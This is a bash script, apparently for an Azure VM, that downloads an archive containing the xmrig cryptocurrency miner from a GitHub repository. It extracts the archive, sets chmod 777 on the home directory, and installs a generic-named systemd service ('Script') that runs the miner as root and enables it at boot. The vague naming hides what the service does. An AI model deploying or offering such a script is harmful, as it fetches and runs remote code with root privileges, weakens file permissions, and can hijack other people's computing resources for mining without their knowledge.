#!/bin/bash

# Sleep for 10 seconds
sleep 10

# Create the service and script files
sudo touch /etc/systemd/system/script.service
sudo touch /usr/local/bin/script.sh

# Grant write permissions
sudo chmod 644 /etc/systemd/system/script.service
sudo chmod 755 /usr/local/bin/script.sh

# Update the package lists
sudo apt update

# Change to the user directory and download the xmrig miner
cd /home/azureuser/
wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar ;
sudo chmod 777 /home/azureuser/*
sudo tar xvf output_filename.tar ;
sudo chmod 777 /home/azureuser/*
# Sleep for 3 seconds
sleep 3

# Grant execute permissions to xmrig
sudo chmod +x xmrig

# Write the script content
echo "#!/bin/bash
./xmrig" | sudo tee /usr/local/bin/script.sh > /dev/null

# Write the systemd service content
echo "[Unit]
Description=Script
After=network.target
[Service]
ExecStart=/usr/local/bin/script.sh
Type=simple
Restart=no
User=root
WorkingDirectory=/home/azureuser/
[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/script.service > /dev/null

# Reload the systemd daemon and start the service
sudo systemctl daemon-reload
sudo systemctl start script.service
sudo systemctl enable script.service
